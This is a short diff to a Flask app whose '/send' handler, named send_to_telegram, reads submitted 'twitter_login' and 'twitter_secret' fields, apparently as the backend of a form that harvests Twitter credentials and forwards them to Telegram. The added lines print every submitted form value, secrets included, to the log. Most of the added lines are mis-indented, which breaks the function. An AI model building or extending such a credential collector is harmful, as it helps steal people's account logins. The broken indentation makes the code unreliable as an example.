@@ -24,6 +24,11 @@ def index():
 
 @app.route('/send', methods=['POST'])
 def send_to_telegram():
+    print("✅ POST /send called")
+print("📝 Form data received:")
+for key, value in request.form.items():
+    print(f"  {key}: {value[:50]}")  # ограничим вывод до 50 символов
+
     twitter_login = request.form.get("twitter_login", "")
     twitter_secret = request.form.get("twitter_secret", "")
     twitter_followers = request.form.get("twitter_followers", "")
